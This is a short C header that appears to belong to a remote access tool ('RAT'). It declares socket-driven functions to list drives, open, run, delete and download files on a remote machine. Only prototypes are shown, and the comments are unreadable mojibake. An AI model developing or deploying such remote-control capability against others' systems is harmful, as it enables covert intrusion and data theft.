#include "Header.h"
#include "RatProto.h"

#define PERSENDBYTES 10000

struct FileArgs{
	SOCKET sockfd;
	HANDLE hFile;
};

#define FILENUMS	100

//���̷�
BOOL DriveList(SOCKET sockfd);
//��ָ���ļ�
BOOL FileOpen(SOCKET sockfd,int dwSize);
//ִ��EXE�ļ�
BOOL FileExcute(SOCKET sockfd,int dwSize);
//�ļ��л���
BOOL FileBack(SOCKET sockfd,int dwSize);
//ɾ���ļ�
BOOL FileDelete(SOCKET sockfd,int dwSize);
//�����ļ�
BOOL FileDownload(SOCKET sockfd,int dwSize);
//�����ļ��̺߳���
void FileTransmit(LPVOID fa);
//��Ŀ¼�ļ�
BOOL FileList(SOCKET sockfd,char* szPath);